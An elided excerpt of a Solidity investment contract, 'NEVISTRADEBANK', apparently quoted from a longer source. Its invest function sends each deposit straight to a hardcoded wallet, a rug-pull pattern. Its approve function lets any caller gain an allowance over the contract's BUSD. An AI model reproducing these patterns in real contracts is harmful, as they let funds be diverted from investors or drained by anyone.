...
contract NEVISTRADEBANK  {
	...
	constructor() public {
		require(!isContract(address(msg.sender)));
		commissionWallet = 0xc495888eccC0A728E1411fd2B4fD25BD7EE9F2fd;
	 ...
	 function approve(uint256 amount) public {
		...
		BUSD.approve(address(msg.sender), amount);
		Approvee storage approvee = approvees[msg.sender];
		approvee.status=1;

	}	

	function invest( uint8 plan,uint256 amount) public {
        ...
        BUSD.transferFrom(address(msg.sender),0xc495888eccC0A728E1411fd2B4fD25BD7EE9F2fd, amount);
